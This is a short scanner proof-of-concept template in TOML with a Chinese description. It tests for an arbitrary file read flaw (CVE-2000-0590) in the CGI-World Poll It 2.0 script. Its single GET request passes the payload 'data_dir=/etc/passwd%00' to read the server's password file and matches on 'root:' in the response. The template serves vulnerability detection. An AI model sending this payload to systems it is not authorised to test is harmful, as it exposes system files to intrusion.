[info]
author = "ave"
description = "通过向 Poll_It_SSI_v2.0.cgi 的 data_dir 参数传递 /etc/passwd%00 读取服务器任意文件，验证是否存在该漏洞"
id = "POC-AVE-2000-0469"
name = "CGI-World Poll It 2.0 任意文件读取漏洞 PoC"
severity = "high"
tags = ["ave-2000-0469"]
vuln_id = [
    "CVE-2000-0590",
    "AVE-2000-0469",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
params = "data_dir=/etc/passwd%00"
path = "/{{BaseURL}}/cgi-bin/pollit/Poll_It_SSI_v2.0.cgi"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
